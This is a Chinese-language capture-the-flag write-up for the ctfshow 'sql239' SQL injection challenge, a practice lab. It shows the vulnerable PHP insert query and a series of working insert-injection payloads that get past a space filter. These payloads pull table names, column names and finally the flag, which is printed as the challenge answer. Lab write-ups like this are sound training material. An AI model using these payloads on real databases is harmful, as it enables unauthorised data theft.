# ctfshow-sql239



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623





 查询语句 

```
  //插入数据
  $sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";
```



 返回逻辑 

```
  //过滤空格 or 

```





```mysql
*好像也过滤了

insert注入，直接闭合单引号，然后自己构造查询语句，把查询的结果insert到表里

注入点api/insert.php


username=1',database())#&password=123456
倒序查找内容
ctfshow_web



username=1',(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&password=1

	
banlist,ctfshow_user,flagbb


列名实在没有办法注入
# username=3',(select group_concat(column_name) from information_schema.columns where table_name='flag'));-- A&password=1


#username=3',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flagb')))#&password=1
	
	
# id,flag,info
	


通过上一题猜的flag列名
username=1',(select(group_concat(flag))from(flagbb)))#&password=1


	
ctfshow{b2c44011-8fc9-41fb-a71a-5b854025fb5f}



```























